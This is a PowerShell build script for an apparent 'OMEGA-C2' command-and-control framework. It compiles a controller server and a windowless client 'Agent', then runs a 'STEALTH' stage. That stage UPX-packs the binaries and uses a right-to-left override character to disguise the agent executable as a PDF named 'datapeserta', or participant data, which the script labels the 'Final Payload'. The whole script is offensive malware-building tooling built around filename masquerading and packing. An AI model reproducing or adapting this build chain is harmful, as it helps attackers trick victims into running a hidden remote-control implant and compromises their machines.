# build.ps1 - Zero-dependency builder for Windows PowerShell

Write-Host "[*] Compiling OMEGA-C2 Modular Framework" -ForegroundColor Cyan

# Flags for zero dependencies for modern g++ on Windows (MSYS2 / MinGW)
# We statically link libgcc and libstdc++ so they don't require external redistributable DLLs.
# We also statically compile the threading model.
# Note: OpenSSL DLLs usually still need to be co-located or the system PATH must have them,
# unless you specifically have static OpenSSL `.a` libraries. We compile dynamically to OpenSSL but copy the DLLs if found.

$cpp_flags = "-std=c++17 -Wall -Wextra -static -static-libgcc -static-libstdc++ -Os -s -ffunction-sections -fdata-sections -Wl,--gc-sections"
$client_cpp_flags = "-std=c++17 -Wall -Wextra -static -static-libgcc -static-libstdc++ -mwindows -Os -s -ffunction-sections -fdata-sections -Wl,--gc-sections"
$libs = "-Wl,-Bstatic -lssl -lcrypto -Wl,-Bdynamic -lws2_32 -lgdi32 -lgdiplus -lole32 -lcrypt32 -lbcrypt -lwininet -lpsapi"

$compiler = "C:\msys64\ucrt64\bin\g++.exe"
if (!(Test-Path $compiler)) { $compiler = "g++" }

# Ensure bin directory exists and has resources
if (!(Test-Path "bin")) { New-Item -ItemType Directory -Path "bin" }
if (Test-Path "cert") { Copy-Item -Path "cert" -Destination "bin/" -Recurse -Force }
if (Test-Path "tools") { Copy-Item -Path "tools" -Destination "bin/" -Recurse -Force }

Write-Host "[+] Resources (cert/ & tools/) disalin ke folder bin/" -ForegroundColor Gray

# 1. Bangun Server (Controller + Daemon)
Write-Host "[*] Mengompilasi OMEGA Server (Modular)..." -ForegroundColor Yellow
$server_sources = "server/src/main.cpp", "server/src/common_state.cpp", "server/src/daemon_core.cpp", "server/src/ipc_manager.cpp", "server/src/session_manager.cpp", "server/src/tunnel_manager.cpp", "server/src/ui_manager.cpp", "server/ssl_server.cpp", "common/protocol.cpp"
$server_out = "bin/server.exe"

$server_args = @()
foreach ($flag in $cpp_flags.Split(" ")) { if ($flag) { $server_args += $flag } }
$server_args += $server_sources
$server_args += "-I.", "-Iserver/include"
$server_args += "-o", $server_out
foreach ($lib in $libs.Split(" ")) { if ($lib) { $server_args += $lib } }

& $compiler $server_args

if ($LASTEXITCODE -eq 0) {
    Write-Host "[+] server.exe berhasil dibangun di folder bin/" -ForegroundColor Green
} else {
    Write-Host "[-] Gagal membangun server.exe." -ForegroundColor Red
}

# 2. Bangun Agent (Client)
Write-Host "[*] Mengompilasi OMEGA Agent..." -ForegroundColor Yellow
$windres = "C:\msys64\ucrt64\bin\windres.exe"
if (!(Test-Path $windres)) { $windres = "windres" }
& $windres client/resources.rc -O coff -o client/resources.res

$client_sources = "client/main.cpp", "client/ssl_client.cpp", "client/executor.cpp", "common/protocol.cpp"
$client_out = "bin/agent_build.exe"

$client_args = @()
foreach ($flag in $client_cpp_flags.Split(" ")) { if ($flag) { $client_args += $flag } }
$client_args += $client_sources
$client_args += "client/resources.res"
$client_args += "-o", $client_out
foreach ($lib in $libs.Split(" ")) { if ($lib) { $client_args += $lib } }

& $compiler $client_args

if ($LASTEXITCODE -eq 0) {
    Write-Host "[+] agent_build.exe berhasil dibangun di folder bin/" -ForegroundColor Green
    
    # -------------------------------------------------------------
    # POST-BUILD OPTIMIZATION & STEALTH
    # -------------------------------------------------------------
    $rlo = [char]0x202E
    $final_name = "bin/datapeserta_" + $rlo + "fdp.exe" # Visually: datapeserta_exe.pdf
    
    if (Test-Path "bin/agent_build.exe") {
        # COMPRESSION STAGE (UPX)
        Write-Host "[*] Mengompresi dengan UPX (High Compression -9)..." -ForegroundColor Yellow
        $upx = "upx"
        if (Test-Path "C:\msys64\ucrt64\bin\upx.exe") { $upx = "C:\msys64\ucrt64\bin\upx.exe" }
        
        # Kompres binary di folder bin/
        if (Test-Path "bin/server.exe") { & $upx -9 "bin/server.exe" }
        if (Test-Path "bin/agent_build.exe") { & $upx -9 "bin/agent_build.exe" }

        # Final Masquerade Rename (tetap di bin/)
        if (Test-Path "bin/agent_build.exe") {
            Move-Item -Path "bin/agent_build.exe" -Destination $final_name -Force
        }
        Write-Host "[+] Optimasi Selesai!" -ForegroundColor Green
        Write-Host "[+] Final Payload: $final_name" -ForegroundColor White
    }
    
    Write-Host "[*] Build Process Finished!" -ForegroundColor Cyan
    Write-Host "NOTE: NOTE: The executables are now 100% Statically Linked, UPX Compressed, and Zero-Dependency!" -ForegroundColor Yellow
} else {
    Write-Host "[-] Build failed. Check compiler errors." -ForegroundColor Red
}
